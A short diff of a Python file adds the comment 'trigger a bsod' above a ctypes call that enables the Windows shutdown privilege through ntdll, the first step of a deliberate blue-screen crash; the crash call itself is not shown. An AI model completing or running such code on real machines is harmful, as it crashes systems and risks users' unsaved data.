@@ -1,3 +1,4 @@
+# trigger a bsod
 import ctypes
 
 ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
